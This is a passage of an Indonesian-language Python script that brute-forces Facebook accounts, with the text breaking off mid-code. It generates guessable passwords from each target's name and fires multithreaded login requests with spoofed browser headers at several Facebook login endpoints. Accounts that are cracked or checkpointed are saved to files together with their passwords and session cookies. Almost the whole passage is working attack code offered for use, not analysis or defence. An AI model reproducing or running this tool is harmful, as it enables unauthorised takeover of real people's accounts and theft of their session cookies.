					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=80,padding=(0,7),style=f"{color_panel}")) 
		print('')
		
def mie():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : OK/%s\nCP Simpan File : CP/%s{P2}'%(okc,cpc),width=80,padding=(0,7),style=f"{color_panel}")) 
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,nmf)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,nmf)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(main_alpha,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(Asepitgans_Xc,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				else:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=80,padding=(0,7),style=f"{color_panel}")) 
		print('')
		
def gggua():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : OK/%s\nCP Simpan File : CP/%s{P2}'%(okc,cpc),width=80,padding=(0,7),style=f"{color_panel}")) 
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'123')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,nmf)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,nmf) 
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(main_alpha,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(Asepitgans_Xc,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				else:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=80,padding=(0,7),style=f"{color_panel}")) 
		print('')
		
def passu():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : OK/%s\nCP Simpan File : CP/%s{P2}'%(okc,cpc),width=80,padding=(0,7),style=f"{color_panel}")) 
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				Depan = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<=5:
					if len(Depan)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				else:
					if len(Depan)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(Depan+'321')
						pwv.append(Depan+'2002')
						pwv.append(Depan+'2003')
						pwv.append(Depan+'2004')
						pwv.append(Depan+'123')
						pwv.append(Depan+'1234')
						pwv.append(Depan+'12345')
						pwv.append(Depan+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,nmf)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,nmf)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(main_alpha,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(Asepitgans_Xc,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				else:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=80,padding=(0,7),style=f"{color_panel}")) 
		print('')
		
		
def babi():
	global prog,des
	prints(nel(f'{P2}Ok Simpan File : OK/%s\nCP Simpan File : CP/%s{P2}'%(okc,cpc),width=80,padding=(0,7),style=f"{color_panel}")) 
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,nmf)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv,nmf)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv,nmf)
				elif 'new' in method:
					pool.submit(crackapi,idf,pwv,nmf)
				elif 'baru' in method:
					pool.submit(main_alpha,idf,pwv,nmf)
				elif 'coba' in method:
					pool.submit(Asepitgans_Xc,idf,pwv,nmf)
				elif 'pengen' in method:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
				else:
					pool.submit(Asepitgans_Xd,idf,pwv,nmf)
		print('')
		prints(nel(f'{P2}Sucses Cracked Ok:%s Cp:%s Akuntod{P2}'%(ok,cp),width=80,padding=(0,7),style=f"{color_panel}")) 
		print('')
		

###----------[ ASYNC ]----------###
def Asepitgans_Xd(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Async [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				#os.popen('play-audio c.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				#os.popen('play-audio o.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
###----------[ REGULAR ]----------###
def Asepitgans_Xc(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				#os.popen('play-audio c.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				#os.popen('play-audio o.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

###----------[ VALIDATE ]----------###
def main_alpha(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]m-beta [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				#os.popen('play-audio c.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				#os.popen('play-audio o.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]mobile [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]").add(f"\r[yellow]{UserAgentPake()}[white]")
				Buat(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{UserAgentPake()}[white] ").add(f"\r[green]{kuki}[white] ")
				Buat(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
	
#--------------------[ METODE MBASIC ]-----------------#
def crackmbasic(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]mbasic [{H2}idf{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	#ua = random.choice(usragent)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=136494494209&kid_directed_site=0&app_id=136494494209&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fapp_id%3D136494494209%26cbt%3D1677604624692%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1768d45e7cf3b8%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%26client_id%3D136494494209%26display%3Dtouch%26domain%3Did.scribd.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.scribd.com%252Fdocument%252F392244848%252FUser-Agent-Android-2019%26locale%3Den_US%26logger_id%3Df3586987545284%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df64f8f3de85d3c%2526domain%253Did.scribd.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.scribd.com%25252Ff1b618b16e20678%2526relation%253Dopener%2526frame%253Df22193e4bc4edfc%26response_type%3Dtoken%252C